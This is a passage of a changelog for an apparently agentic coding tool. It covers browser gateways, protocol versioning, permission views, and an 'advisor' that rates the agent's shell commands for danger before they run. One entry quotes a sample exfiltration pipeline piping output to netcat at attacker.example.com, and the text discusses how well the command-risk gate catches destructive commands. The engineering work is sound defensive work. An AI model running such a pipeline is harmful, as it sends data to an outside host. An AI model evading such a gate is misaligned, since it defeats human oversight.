  to mean *instead of* a screen: the third loop took the `App` and there was nothing left to draw
  with. It is now the drawn loop with a socket beside it wherever there is a terminal to draw on,
  which is the shape the fan-out was already built for - a connection is a task holding a `Kernel`
  and an mpsc sender, and only the four things that need `&mut App` come back to whichever loop has
  it. `remote::Serving` is that half of `Server::run` extracted: `pump` says what the session has
  said, `arrived` and `attend` take on a connection, `asked` and `answer` do what it asks. Two
  branches in the loop that has the keys, and no change to the protocol.

  Three calls rather than one loop because a `select!` branch may borrow the receiver or the `App`
  and not both, which is what `Asked` and `Arrived` are: the value that passes between waiting and
  doing.

  **`App::keys` is now a fact about whoever just asked**, not about the session. It says whether
  `/help` lists the key bindings, and one `App` has two audiences the moment it is drawn and served
  together - so a client's command sets it around the one call that reads it. A `/help` at the desk
  has the keys and the same `/help` from a browser does not, which is what the flag was for before
  a session could be both.

- **`examples/phone.rs`: a session in a browser, from one command.** `gateway.rs` relays to a
  session somebody else started, which is the honest shape for a relay and two commands for a
  person. `cargo run --example phone` wires a session of its own, binds it to a loopback port the
  kernel picks, and serves the same page in front of it. The HTTP half moved to `examples/relay/`
  and is included by both with `mod relay;` - the way `tests/common` is - so `gateway.rs` is still
  only a relay and neither example restates the other.

- **`examples/gateway.rs` and `examples/browser.html`: a session in a browser, from a phone.** A
  browser cannot open a TCP connection - not inconveniently, at all - so something has to terminate
  HTTP in front of a session. The gateway is that, in three routes, with no framework, no router
  and no dependency this crate did not already have; the page is one file with no build step. The
  semantic protocol is not touched, which is what a gateway is for.

  **`text/event-stream` already had the protocol's shape in it**, and that is why it is SSE rather
  than a WebSocket. An event may carry an `id:`, and a browser that loses the stream reconnects by
  itself and sends `Last-Event-ID:` - which is exactly `attach { since }`. So the browser implements
  resume with no client code at all, which is the fiddliest part of a client and eighty lines of
  `remote::Client`. The negative space matches too: an event with no `id:` does not move
  `Last-Event-ID`, so records and the projection get one and fragments of a model still typing do
  not - a browser never tries to resume from something that was never recoverable. Measured against
  a live session: reconnecting with `Last-Event-ID: 12` was answered with records 13 onwards and no
  second copy of the projection.

  A WebSocket would be one connection instead of two and would cost a handshake, client-frame
  unmasking and fragmentation - or a dependency - and every line of that reconnection. Commands go
  the other way by `POST`, and there are four or five of them in a session.

  **There is no authentication in the gateway and no encryption.** `kamchatka --serve` still refuses
  to listen anywhere but loopback; the gateway takes its listen address outright and says what a
  non-loopback one means, because an example somebody runs on their own network for an afternoon is
  a different thing from a program's default. Whatever reaches it reaches the `shell` tool.

- **`App::decide`, `App::notes` and `App::queued`.** The first is the whole of what answering a
  permission question is, in one place: `App::answer`, which is the half that was already shared,
  plus honouring `always` over what the policy really consulted rather than over what the tool
  declared, sweeping the questions already queued behind this one, and driving the turn on once
  none are left. Those three lived beside the keys, so the keys did them and the headless driver
  did not - and a third loop reaching the same fork is what made it a function rather than a
  fourth copy. `App::notes` is the program's own lines since a watermark, with the rule about
  counting the *filtered* sequence stated once instead of in each loop that prints them.
  `App::queued` is the message waiting for a running turn to end, exposed because there is room
  for exactly one and a second client needs to be told when its line replaced somebody else's.

- **Two socket options and a reconnection policy, for a port rather than a socket file.**
  `TCP_NODELAY`, because Nagle holds a small write until the last one is acknowledged and every
  frame here is small; and keepalive, because a peer whose machine slept sends no `FIN` and a read
  waits for ever - on the session that is a connection task holding a `Kernel` and never reporting
  the client as gone. Neither matters on loopback, which is why neither was there. `socket2` is a
  direct dependency for them and is not a new crate in any sense that costs anything: `tokio` builds
  it for `net` and `reqwest` for its own reasons.

  The reconnection was five attempts a quarter of a second apart, which is right for a socket file -
  the only way to lose one is the host going away, and it either comes back at once or it is not
  coming back - and useless over a port, where the ordinary reason to lose a connection is a laptop
  changing access points and the ordinary time to get one back is several seconds. Giving up after
  one and a quarter was a client reporting a session lost while it was still there. It backs off
  from a quarter of a second towards five, for up to a minute, and says how long it waited when it
  gives up.

  None of the three is observable through the protocol, so the one test about them is about the
  *platform*: both are set on a real loopback pair, `TCP_NODELAY` is read back off it, and the
  keepalive is made a second time and its answer asserted. It cannot be read back, because `tuned`
  drops the result on purpose - a machine that refuses one of these should cost somebody a
  connection option and not a session - so making the call is the only way to find out whether the
  machine takes it. `socket2` gates `with_interval` by operating system, and CI builds on three of
  them.

- **`/cleanup`, which is `ctrl+l` as a command.** It takes the program's own lines off the chat -
  what it said about what it did, and what it answered a command with - and leaves the
  conversation, which is the context and is not this program's to take away. `clear_notices` was
  reachable only by a key, so the two loops with no keyboard could not reach it at all, and the one
  where a pile of notices is the whole screen rather than a quarter of a tall one is the browser.
  It says nothing when it is done, which is that function's own rule: a line reporting that the
  lines are gone would be the first line of the pile it just cleared.

  **It is not called `/clear`**, and the name is the one decision in it. Everywhere else that word
  is typed at an agent it means the conversation, and this deliberately leaves the conversation
  alone - so the one thing somebody would be typing it for is the one thing it does not do. It is
  the trap `/load` declines to set by not calling itself `/resume`. `/clear` is answered rather
  than left to the line that says there is no such command, because the two things it could have
  meant are two different commands here and somebody told only that it does not exist would find
  neither: it names `/cleanup` and `/exclude all`, and says that the second is a state change and
  comes back.

  **It breaks an invariant two loops were relying on, which is most of what this cost.**
  `App::notes` is a watermark over the Note-and-Error lines and its own note says why that is safe:
  the filtered sequence is append-only, whatever the list underneath does. A clear empties that
  sequence, so a loop holding a mark of three against a sequence of nothing swallows the next three
  lines - silently, and for the rest of the session. `App::cleared` is a generation counter for
  exactly this, both loops read it, and `Message::Cleared` carries it to every attached client,
  which is also what makes a session two people are watching clear for both of them rather than
  one. Measured: breaking either reset fails only the test written for it.

- **`project`, and `Message::Projected` answering it: the projection again, and nothing else
  changes with it.** `attach` answers with one too and is the wrong way to ask, because a client
  takes an `attached` as *start again*: it has just been handed the conversation and the stream
  that carries on from it, so whatever it had drawn belongs to a stream it is no longer on. What
  the new command is for is the half of a session that is not the conversation: the items, the
  budget, what the policy will answer. Those cannot be added up from the stream, and the reason is worth stating
  because it looks as though they could - `context.added` names an item and says nothing about what
  the *next request* will do with it, and `going`, `left_out` and `marker` are answers to that
  question. They are worked out by projecting, so they are only true as of a moment.

  It is a separate variant from `attached` rather than the same one twice because a client takes an
  `attached` as *start again*. One that could not tell them apart would wipe its own screen to
  refresh a token count.

  `Attached::undecided` goes with it, and is the permissions tab's own figure: how many subjects the
  policy holds an opinion about and will simply ask. The rows deliberately list only what somebody
  has decided, so a client cannot count what is missing, and one showing two decisions while
  standing for eighteen answers is a different kind of dishonest.

- **The page has the terminal's four tabs.** One button in the top right corner cycles chat,
  context, permissions and events. The context view is the context tab's rows, with a button on
  each that moves the item to its next state and a tap on the row itself for the whole of what it
  holds; the permissions view is the rules and what each covers, under the confinement; the events
  view is the session log, by each record's own name.

  The event log is deliberately **not** the terminal's trace. That is a rendering of the records in
  this program's words, and a page writing a second set of them would be a vocabulary to keep in
  step with one nobody can see from the other end - so what it shows is the record, which is what
  this page was being sent anyway and the reason the view costs no protocol at all. It keeps the
  last four hundred, which is the terminal's own trace depth and for its reason: the log is
  unbounded and is the session's, and what a page can draw is not.

  The prompt is on the chat and nowhere else, which is where the terminal keeps it - a view that is
  a list of rows has nothing to say to a box that takes a line. A waiting question colours the
  cycler instead of following you about, which is the same thing the tab strip does by going red.
  The order is `Tab::ALL`, down to the event log sitting where the trace does rather than at the
  end where it was easiest to put: somebody who knows one of these two should not have to learn the
  other's habits.

- **The chat follows the context, the way it does at the terminal.** It was append-only, so an item
  taken out of the request stayed on the page that took it out - the state moved on the context
  view and the conversation did not. `App::conversation` is what decides that shape, and it is not
  a rule a page can keep a copy of: an excluded item is gone from the chat and an *elided* one is
  still there in full, because eliding is about what the model is sent and the marker is for it
  rather than for the person. So the records that reshape a conversation - a state change, a
  compaction, an undo, a rewrite - ask for a fresh projection and the chat is drawn from that.

  Not `context.added`, which is the one the page already draws as it arrives; rebuilding on it
  would take away the bubble a model is writing into every time a turn was recorded. For the same
  reason a rebuild that falls during a turn is held until the turn ends, rather than done and
  undone.

- **An elided item was sent to clients as the words it still holds.** The one thing an elision
  means is that the model no longer has them, and the substitution that says so - the projector's
  marker, in the brackets it put round it - was in `ui/tabs.rs`. So the screen was right and every
  client was handed a conversation the model is not having. It is `App::conversation` now, which
  takes the `Going` it needs, and `ui/` is back to deciding nothing; the screen is unchanged, which
  the three chat tests that already covered it confirm.

- **`Attached::trace`: the trace tab, for clients that have no trace.** The page had been given the
  *records* under that name, which was the wrong thing wearing the right label: a record says
  `context.compacted` and carries a `CompactionReport`, and the trace line says what that pass took
  and what it left, in this program's words. A client rendering the records itself would be writing
  a second vocabulary for one session, and it would be the one nobody at the other end can see.

  The gap goes with it, worked out on the session's side, because when there *is* one is a decision
  rather than a format: nothing under a tenth of a second, and nothing after a line that ended a
  wait for a person - however long somebody took to answer a question, it is not a step this
  program spent, and it is reliably the largest figure in the column. `text::waited_since` moved
  out of `ui/tabs.rs` for it, under the rule the rest of that module is there for: a client can
  reach it, so it cannot live behind the feature that draws.

- **`App::cycle`, and `cycle` on the wire: the state ring, in one place.** `space` on the context
  tab moves an item from seen, to a marker where it was, to gone, to seen again - and the ring and
  the notes it writes were in `keys.rs`, where a second client could not reach them. The notes are
  the reason this is a function rather than three commands and a client that knows the order: they
  are read by the *model*, in the brackets the projector puts round them, so a page writing its own
  words for the same act would put two accounts of one thing in front of it.

  Measured, and the answer was not the expected one: reversing the ring fails four tests in the
  screen suite and one of the two new ones. The ring was already well covered; what was not covered,
  and is what the new test is for, is that a client can reach it at all.

- **The page opened with its conversation and its prompt hidden.** The stylesheet reads a class on
  `body` to decide which view is showing and `show` is the only thing that sets it, so a page that
  had never cycled a tab had no class at all - which `body:not(.chat)` reads as *not the chat*. The
  chat and the prompt came back the moment somebody cycled round to chat, which is what made it
  look intermittent. `show("chat")` runs before the stream is opened now, and the invariant it
  keeps is that the class and the view always agree.

  `draw` was the other half of the same shape: the permissions view was its fall-through, so any
  view it did not know about was drawn as the permissions. Named, because a view this does not know
  about is a bug and drawing something plausible at it is the kind that looks like a feature.

- **A streamed answer could be truncated, or arrive behind blank lines.** The page kept whatever
  fragments had arrived as the final text of a turn, and fragments are the half of the stream that
  can be lost: a page that fell behind kept a short answer for good, with nothing to say so. They
  are also what the provider sent byte for byte, so an answer that began with two newlines began
  with two newlines - measured, `'\n\nok'` against a recorded `'ok'`.

  The terminal has neither problem because it does not keep them: `Entry::transient` drops every
  streamed line the moment the turn is recorded, and the chat is read off the context from then on.
  The page does that now - the fragments stay as the live preview they are, and the recorded item
  replaces them when it arrives. A rebuild also keeps the reader where they were rather than
  snapping to the newest line, which matters far more now that one happens every turn.

- **The permissions view drew the rows and left out the policy.** `shell: confined` sat over an
  empty table, which reads as a claim that nothing can happen - and a model had just run `ls`. Both
  halves of the answer were missing, and both are on the tab upstairs. Above the rows: `Careful ·
  anything it has not been told about: ask`, which is what a session actually does and is why the
  model was asked and somebody allowed it; a one-off answer writes no rule, which is why the table
  is still empty afterwards. Below them, the tab's own footer, in the tab's order - the sandbox
  line first, because it is the one thing there that is not negotiable, and then the count of what
  is not listed. And the tab's empty-state prose, which says in as many words that an empty list is
  not a permissive one, and that path rules bind `fs` and deliberately not `shell`: a command names
  its files inside a string, so what holds it to a boundary is the sandbox rather than a rule here.

  `Attached::policy` and `Attached::untold` are what carry it. A list of decisions is not a policy,
  and a client drawing the rows alone was answering "what will this session allow" with whichever
  part of the answer somebody happened to have given already.

- **The header lost the session's name and found its lines.** The name is a timestamp, which is the
  one thing up there nobody reads twice and the widest thing on a phone; it is still what the record
  is filed under, what `/save` writes and what `setup` says. And `--line` - every border on the page,
  from the header to the box you type in - was two shades off the background, which is a hairline on
  a good monitor and nothing at all on a phone in daylight. About 2:1 against the background in
  either scheme now.

- **A blinking mark in the corner, and it is the whole of what the bar says about a turn.** A turn
  can be a minute of nothing arriving - a model thinking, a command running, a provider gone quiet -
  which from a phone is indistinguishable from a page whose connection died. `working…` and
  `reconnecting…` were words beside it that said what the dot was already saying, and cost the row
  the width that made it wrap; the two states are a colour on the one dot now, the colour a call is
  drawn in and the colour a refusal is. It honours `prefers-reduced-motion` by holding still, which
  says the same thing.

### changed

- **The rubric's three levels are short again, and the length was measured rather than judged.**
  They had grown into three long sentences naming the operations and repeating "once it has
  finished". Against the smaller of the two engines that is not a subtle cost: `ls` came back
  with its distribution spread across all three levels, 0.39 on the top one, where against the
  short levels it is 0.84 on the level it belongs to. The *score* was right either way - what a
  long rubric cost was the confidence, and an answer nobody is sure of is one this program will
  not draw green, so every command came out yellow.

  The `cd` fix is kept whole: the bottom level still names moving about and still asks for
  nothing left changed. What went is the elaboration around it. This is the convention about
  length doing real work rather than being a matter of taste, and anything added back should be
  measured the same way - `contrib/laya_advisor.py --probe` is what measures it.


- **The rubric's bottom two levels turn on what a command *leaves* changed, not on whether
  anything changed while it ran.** `cd src` changes the working directory, and asked the old way
  it landed on the middle level for it - a yellow line on one of the commonest things an agent
  writes, which is a yellow line nobody reads. In this program a `cd` does not even change
  anything durable: every call is its own `sh -c`, so the next one starts in the working
  directory again.

  So the bottom level names moving about among the things that qualify and asks for nothing left
  changed once the command has finished, and the middle one asks for something still changed
  after it - a file, a package, a setting. The band `Rating::Reads` is read back as is now
  `looks, and leaves nothing changed`, where it was `reads and reports`; a client draws the
  words it is sent, so nothing else has to change with it. The top level is untouched.

  It matters more now that a command is placed stage by stage: a `cd` used to be a clause inside
  a reading of a whole command line and is now a stage put on the rubric on its own.

- **`tools::joints` says where one stage of a command line ends and the next begins, and is no
  longer behind `tui`.** It was `ui::text::joints`, beside the panel that colours a command's
  `|`, `&&`, `||` and `;` and reachable by nothing else. Where a command comes apart is a fact
  about the command rather than about drawing it, and a session with no screen could not ask -
  which is every headless one, and anything in `tools` that reads a command before it runs. It
  is `pub` now, so a client drawing its own permission panel gets the same reading the terminal
  gets rather than a second one.

  Nothing about the scan changed, its tests moved with it, and what it declines to answer is
  still the interesting half: a quoted separator, a joint inside `$(…)`, a `;;` ending a `case`
  arm, a lone `&`, and any command with a newline in it, since what is inside a heredoc is
  arbitrary text.

- **`examples/phone.rs` takes the program's own arguments, every one of them.** The session it
  assembles is the program's session, and it was assembled from two positional words: a listen
  address and a model, which it defaulted to `openai/gpt-4o-mini` — the thing `--model` stopped
  doing this release, still being done one directory away. There was no way to ask it for
  `--advise`, a system instruction, a tool, a path rule or a settings file.

  `Args` moves out of `main.rs` into `kamchatka::args`, with the three steps that turn one into a
  session beside it: `Args::given` reads the command line and fills it in from a settings file,
  `Args::setup` is the `Setup` it describes, and `Args::provider` is where its requests go. What
  stays in `main.rs` is what is genuinely the program's — which loop drives the session, where the
  record is written, and the refusal that `--connect` assembles nothing. Anybody building a session
  of their own on this crate gets the same three.

  Where the *page* listens is the one thing that is not an argument: the positional is the first
  message now, and `--serve` already names the session's own socket. It is `KAMCHATKA_PHONE_LISTEN`,
  loopback unless it says otherwise, and `--serve` or `--connect` on that command line is refused
  rather than ignored.

- **A session started without `-m` picks no model, and says so.** There used to be a default -
  `openai/gpt-4o-mini`, or `gemini-3.6-flash` with `--gemini` - so a first run talked to whatever
  this program's author had picked, at the person's expense and with nothing saying the choice was
  not theirs. Now the session starts all the same, with the address and the key settled, and the
  kernel is handed no provider at all until `/model` picks one.

  That state is the runtime's own, rather than a flag this program keeps: `model_info()` answers
  `None`, so a turn is `Error::NoProvider` and cannot become a request naming nothing. What the
  program adds is the three places a person reads it - a line at startup, a placeholder where the
  name goes in the corner rather than one chunk fewer, and a refusal from `App::start_turn` naming
  the command that ends it, which is where every way of starting a turn goes through. A message
  typed before a model is picked stays in the context and is asked of the model picked afterwards.

- **`attach` says which session it is resuming, and which version of the wire it speaks.** Two
  fields, both on the one message, and both are here before anybody needs them because neither can
  be added once two ends are deployed - `RUNNING.md` recommends reaching a session with `ssh -L`
  from another machine, which is exactly where two installed versions meet.

  `session` is what keeps a watermark out of the wrong session. A session restarted at the same
  address has a log of its own, and a number from the one before it is either too large - refused
  already - or perfectly plausible, at which point a client drew one session's records under
  another session's conversation with nothing anywhere saying so. The refusal is named `attach`
  rather than reported as the connection's, because it is the one failure a client can do something
  about: `--connect` puts down what it was holding and comes back with no watermark, where before
  it sent the same impossible resume every time it reconnected and gave up after a minute on a
  session that was there. `examples/gateway.rs` remembers the name off the first projection, so the
  browser keeps its resume with no client code at all.

  `version` is refused when the session does not know it and served when it is older and known, so
  a mismatch is a sentence rather than a parse error and sixty seconds of retries. A client that
  does not say is version 1, which is what everything written against this wire before the field
  existed speaks. The refusal is named `version` rather than `attach`, because attaching afresh
  cannot mend it. `Attached` carries the number back the other way for the same "before anybody
  needs it" reason: a client learns what the session speaks from the first thing it is handed,
  rather than by being refused to find out. Serving an older client is the half that is not
  machinery yet and is in `POSTPONED.md`, since nothing can exercise it while the number is 1.

- **`Command` and `Message` each have a variant for what this build has no name for, and the rule
  is ignore what you do not know.** Without it, one new message on a session's side turned every
  older client into a parse error, a closed connection, sixty seconds of retries and an exit - for
  a session that was working perfectly. A client reads the unknown one, prints nothing, and carries
  on with the records, which are what carry what happened. An unknown *command* is answered with a
  `failed` rather than by closing the connection, because a client that sent something is owed
  exactly one answer whether or not this end knows what it was.

  `examples/gateway.rs` reads the wire as JSON and passes it on rather than parsing each message
  into this build's own enum and writing it out again, which would turn everything a later session
  said into `unknown` on the way past. What a relay has to understand is the tag and one number.

  The wire types - `Attached`, `Line`, `Listed`, `Stanced`, `Tracing`, `Printed` - are
  `#[non_exhaustive]`. The convention is that it goes on every struct this workspace answers with
  and nothing outside it builds, and these are the ones where it pays: a field is what they grow.

- **`--connect` silently ignored every other argument.** `kamchatka --connect unix:/x -m "a
  question"` connected and dropped the message on the floor, and `--headless --connect` took the
  flag and ignored it. A client assembles nothing - the model, the key, the tools, the sandbox and
  the context all belong to whoever is serving - so anything else on that command line is a thing
  that will not happen, and it is named rather than counted. Read off the matches rather than
  declared as `conflicts_with_all`, because the list would be every argument this program has and
  two of them are behind features.

- **A refused socket file did not say which kind it was.** `Drop` is the only thing that takes one
  away, so a session that was killed leaves a path every later `--serve` refuses for ever - and the
  refusal read the same as the one for a socket a session is using right now. They want opposite
  things done about them, so it connects and says which it found: attach to that one, remove this
  one.

- **A line the gateway would not take vanished off the page.** `examples/browser.html` threw the
  `fetch` response away, so a `409`, a `502` and a dead network all looked like a command that
  worked - and the typed line was already drawn, with the box already emptied. It says what the
  gateway answered, takes the drawn line back, and puts the words back in the box, which is what
  somebody wants after a line that did not send.

- **A browser reconnecting under the same tab id had its stream removed by the old one.**
  `examples/gateway.rs` dropped its tab from the map when its relay ended, without looking at
  whether the entry was still that relay's. A half-open TCP - the case the keepalive exists for -
  meant the new stream's entry went instead, and `POST /do` answered `409 no such tab` to every
  line typed until the browser reconnected again.

- **The first line of a request had no cap on it.** `MAX_HEAD` was checked against the header lines
  below it, after each had arrived, so a peer that sent a request line and no newline was read into
  memory for ever - the shape `MAX_LINE` had in the protocol, in an example.

- **`examples/attached.rs` never flushed a fragment**, so the streaming it exists to demonstrate
  arrived a line at a time, which is what not streaming looks like. The suites take the binary's
  path from `CARGO_BIN_EXE_kamchatka`, which cargo sets for exactly this and which knows about
  extensions and profiles.

- **`MAX_LINE` was checked after the frame had been read, against the one case it names.** Its own
  doc says what it defends against is a peer that never sends a newline, which would otherwise be
  read into memory for ever - and that was the case it could not catch, because
  `Lines::next_line` grows its buffer until a newline arrives and the check ran on what came back.
  `protocol::Frames` holds the part-read frame itself and stops as soon as there is too much of it.
  It is cancel-safe for the same reason `Lines` is, which both loops that read commands need: the
  part-read frame lives in the reader rather than in the future.

  **The reading side owes the limit and the writing side does not**, which is now said where the
  constant is. Nothing caps what a session writes, so one `context.replaced` over 32 MB is written
  by the session, refused by every client, and met again on every resume - which locks everybody
  out for the rest of the session. That is in `POSTPONED.md` with what would close it, along with
  arbitration between clients, and a client command that awaits the endpoint holding the whole
  session loop.

- **<kbd>ctrl+c</kbd> was subscribed to once per turn round each loop, and deaf between them.**
  `tokio::signal::ctrl_c()` is an `async fn`, so naming it in a `select!` builds a new subscription
  every iteration and drops it with the future - and its own documentation says the future
  completes on the first press *after* the initial poll. A signal delivered between one iteration
  finishing and the next poll is not late, it is gone: the handler sets a flag, the driver
  broadcasts to whoever is listening, and a receiver made afterwards starts from the present. What
  makes it worth closing rather than noting is that all three loops read a *second* press as "leave
  now", and the press that lands in the window is the second one, arriving while the first is still
  being handled. `stopping::Stopping` subscribes once and all three hold one.

- **A hidden turn read as one hidden thing per line it used to have.** `App::conversation` put the
  marker on every line an elided item produced, so a turn that was a thought, a sentence and two
  calls became four identical markers. The pane dims the block, so the repeats read as one there
  and the substitution was a faithful port of what it did - but a client drawing rows has nothing
  to draw them as but four rows, and the marker stands for the item. It is one line now, in the
  item's own place and the item's own voice: a turn that opened with a thought put its `reasoning`
  line first, so taking that line's speaker drew the marker for the whole turn as a hidden
  *thought*, where what went was a thought, a sentence and two calls.

- **A headless run that was never asked to take <kbd>ctrl+c</kbd> took it away from whoever was.**
  Subscribing once rather than once per turn round the loop closed the window a press could fall
  into, and moved the subscription out of the `select!` branch that was gated on
  `Headless::stops_on_ctrl_c` - so it happened whether or not anybody had asked. A subscription is
  what installs the process-wide handler, and it installs it for the life of the process: the
  handler went in, the branch never polled it, and SIGINT reached nothing at all. `cargo run
  --example recorded` and the suites were ctrl+c-proof. The other half was worse for an embedder,
  because the driver that subscription needs comes with the io driver: a host on
  `new_current_thread().enable_time()` could drive `Headless` and now panicked in it, over a flag it
  had opted out of. The subscription follows the flag again, and a run without one waits on a future
  that is never ready - which is what the deadline branch beside it already does.

- **The gateway capped its request line and not the header lines under it.** `examples/gateway.rs`
  read the first line through a `take` and went back to a bare `read_line` ten lines down, so a peer
  that sent a well-formed request line and then a header with no end to it was read into memory for
  ever - the same bug, in the same function, and the note above the fix said it was finished. Every
  line of the head is read through what is left of `MAX_HEAD` now, and the question after each read
  is the same one: whether a newline arrived, or the allowance ran out.

- **A refused version was retried until the client gave up, and then blamed the silence.**
  `--connect` treats a refused attach as something to start afresh from, which is right for the
  watermark it was written for and wrong for a version: the next attempt says the same thing and is
  refused for the same reason, so the client spent a minute on it and exited with `the session has
  not answered for 60s` - which is the one thing that had not happened. It answered immediately,
  with a sentence saying which end was older. The refusal is named `version` rather than `attach`,
  and the client leaves on it with the session's own words.

- **A message this build had no name for did not count as an answer.** `Message::Unknown` is the
  rule "ignore what you do not know", and a client that ignored it entirely was one whose count of
  answers owed never came back down - so the first time a newer session answered a command with a
  variant this build lacks, stdin closing stopped detaching and the session going quiet stopped
  ending it, for the rest of that connection. That is the exact hole the forward-compatibility work
  was for, with the new escape hatch around it. An unknown message is counted as an answer now, on
  the grounds that a client owed one and handed something it cannot read has, as far as it can tell,
  been answered: `Unknown` carries no payload, so there is nothing else to go on. It is a decision
  about which way to be wrong, and the cost is a client that leaves a beat early on a message it
  could not have printed.

### fixed

- **`examples/phone.rs` lost the session on `/restart` and on `/quit`.** It wired a session and
  waited for `Server::run` to return, which it does on either, and the process ended with the
  session in memory and nothing on disk: the record every run of the program writes was
  `main.rs`'s and not the library's. It loops the way `main.rs` does now. `/restart` writes the
  session out and puts a fresh one behind the same socket, which the page comes back into by
  itself, and `/quit` writes the last one out and says where.

- **The two advisor tests that read the engine's stderr wait for the lines they assert on.**
  `what_the_engine_says_about_itself_is_captured_rather_than_printed` waited for the first line
  the shim wrote and asserted on the second, and the "not ready, then ready" test asserted on the
  ring as soon as the probe was answered. The ring is filled by its own task, and on Windows the
  pipe is read on a blocking thread that returns as soon as it has anything, so lines the child
  wrote before answering land in the ring one wake-up at a time after the answer - which is the
  race the Windows job lost. Both now wait for the count of lines the shim wrote, with the same
  budget the other waits in that file have.

- **The pty test for the drawn restart is gated on `tui` as well as on the platform.**
  `a_restart_on_the_drawn_loop_lets_go_of_its_clients_too` asked for `target_os = "linux"` and
  nothing else, so a screenless build ran it against a program with no `drawn` loop in it: the pty
  landed on `Server::run` and the guard written for exactly that case failed the run. Both
  configurations CI builds without a screen went red on it, and a whole-workspace run with every
  feature on - which is what a release is checked with - cannot see either of them. The rest of
  `tests/remote.rs` still runs in all three.

- **`restart_writes_the_session_out_and_starts_another` is `#[cfg(unix)]`,** like every other
  test that spawns the binary. It was not, and `common::program` is - so the Windows job did not
  compile `tests/headless.rs` at all. The gate is the test's own isolation as much as the helper:
  it points the child at a `TMPDIR` of its own and counts what landed there, and Windows reads
  `TMP` and `TEMP` instead.

- **The chat property survives a sequence that undoes the whole conversation.** Four undos take
  back both questions and both answers, and the next move aimed at an item picked one out of an
  empty context by remainder - a division by zero, and a panic the macOS job drew. The seed is
  random by design, so any job could have. With no row on the context tab to press a key on, a
  move aimed at an item now does nothing, and the empty chat it leaves is checked like any other.

- **Every question the advisor is asked now names the part of the state it is about.** A System
  One engine is handed the state as one object and the question as another, and nothing tells it
  which part of the state the question concerns unless the question says so - the open engines'
  own presets all name their field, and these named none. So the verdict and the irreversibility
  question name `arguments`, and the rubric names `cmd` and `stage`.

  Measured against `laya`, which is the one that needed it: over thirty destructive commands the
  verdict went from 7 `deny` to 15, and from one answer clearing the confidence threshold to
  three, with ordinary work answered exactly as before. Against `jev` it is a wash in the same
  direction - it was already reading the state right. Neither engine got worse at anything
  measured.

  The state itself is unchanged, and deliberately: flattening it so the command sits at the top
  level helps `laya` further and makes `jev` slightly worse, and `jev` is the engine the feature
  is written for. What leaves the machine is exactly what left it before.

- **`--probe` sends the state the program sends, and both of the requests it makes.** The rubric
  was copied into the shim and pinned by a test; the *state* was not, so the probe put a bare
  command line to the engine where the program puts the whole call. That is an easier question,
  and the gap between the two answers was wide enough to be written down in `advice.rs` as a
  measurement about the rubric's length. That note is withdrawn - the length stands on the toll a
  model pays for every request, which needs no measurement.

  The probe now builds its state through the same shape `advice::state` does and asks both the
  gate's pair and the rubric, so a report from it is about the session somebody is actually
  running. `the_probe_asks_the_question_the_program_asks` checks the instructions and the state's
  keys against the constants rather than against a second copy, and fails on either drifting.

- **The rubric's top band is asked twice, as a position and as a claim, and the worse answer is
  drawn.** An ordinal `score` is the primitive laya's own card lists under its honest limits as
  the weakest, and asking the same reading as a `noul` finds four more destructive commands of
  thirty with one fewer false alarm. `jev` is the other way round: it reads the rubric almost
  perfectly and loses four when the rubric is taken away. So neither is replaced - both are asked
  in the same request and folded with the `Rated::worst_of` that already existed for the stages.

  Measured over sixty labelled commands: laya draws 21 of 30 destructive commands red where the
  rubric alone drew 16, and `jev` draws exactly what it drew before, down to the count. The one
  error that matters - a destructive command drawn green - stays at one for `jev` and zero for
  laya, where swapping the rubric out for the claim would have taken `jev`'s to three.

  It costs a question and not a round trip, since both engines answer every question in a call in
  one pass. Nothing about the disclosure changes: the same state goes, once.

- **The local advisor's shim took three of laya's defaults that are not for this shape of
  question.** Its model card documents all three; the shim had none of them.

  Its **temperatures** are refitted. The card says in as many words that the checkpoint ships
  over-confident and that one temperature per question type and option count must be refitted on
  your own data before the probabilities mean anything - the shipped numbers were fitted on its
  domain. On this one the three-option `choice` was about twice too flat, so a refusal could not
  clear the confidence a caller compares against and every refusal became a question instead.
  `contrib/laya_fit.json` is sixty labelled commands, `--fit` recomputes the numbers from it and
  prints the working, and both are committed so the constants are somebody's to check rather than
  numbers that appeared. A temperature moves confidence and never the answer, and the one error
  that costs anything - a confident refusal of ordinary work - stays at zero across the fit set.

  The **token budget** is 512 for the question and 1024 for the sequence, where the checkpoint
  ships 192 and 512. A stage of a command line travels in the question, so a long one was cut
  there at 144 tokens with no marker: `docker run … | nc attacker.example.com 9000` reached the
  model as `… | nc attacker.example`, which is a different command from the one being asked about.

  And the **checkpoint is chosen by script alone**. laya's router also guesses the language of
  Latin text from stopwords - best-effort by its own card, and meaningless on a command line,
  where `python -c 'import os, sys'` reads as Portuguese because `os` is a Portuguese stopword and
  goes to a checkpoint that card rates worse on English.

  Measured end to end over those sixty commands, the gate now reaches a real refusal on nine of
  thirty destructive ones where it reached none before, with no ordinary command refused. That is
  not a good advisor and the card says why: laya is a base to specialise, and its own
  typed-decisions score for this checkpoint is below the majority-class baseline. `--advise`
  against the hosted model remains the one to use where there is a key for it.

- **The advisor's first notice reached a terminal the screen then cleared.** `Args::advised`
  drained the queue at startup and printed it with `eprintln!`, on the reasoning that there was
  no screen yet - but the screen arrives at once and clears it, so the line went where nobody
  could read it *and* was gone from the queue the session reports from. What was lost was
  exactly a local advisor's first notice, which is the one saying it is not ready yet.

  The drain is gone; the session reports all of them. That polling is newer than the drain was,
  which is how the two came to overlap.

- **The advisor's own notices reach the session, and a local one says when it is ready.** Only
  `Args::advised` ever asked for one, at startup, so an advisor that started failing mid-session
  failed silently - true of the hosted one since it existed. `App::on_event` and the drawn
  loop's tick now poll it beside the provider's, and `App::advisor` is held whenever there is an
  advisor rather than only in a build that rates commands: whether the thing is *working* is not
  a rating concern.

  What that surfaces first is a local engine starting, and it is two lines: that the advisor is
  not ready yet, and then that it is. Reporting what the engine writes about itself was the
  first attempt and is unreadable - a downloader draws a progress bar by rewriting one line with
  carriage returns, so a session filled up with `Fetching 38 files: 0%|    |`. Those lines are
  kept for the failure they would explain and are not reported.

  The second line means the engine *answered*, not that it printed a word. It is asked one
  trivial question as soon as it starts and readiness is that coming back, so a shim that cannot
  answer is found before a permission question depends on it rather than at the first `y` -
  which is the startup check `Jev::probe` gives the hosted one and a local one had none of.
  Reading a word like `ready` out of the child's output would have been matching a magic string
  in a program this does not own.

- **A local advisor rated every command yellow, `ls` included, at 1% confidence.** The rule that
  produced it is right: kamchatka will not draw a reading nobody is sure of green, because a
  spread distribution over a safety rubric is not evidence that a command is safe. The input was
  wrong. laya's `confidence` is its own quantity rather than how concentrated the distribution
  is, so `ls` - correctly scored near zero, "it only looks" - arrived with a confidence of about
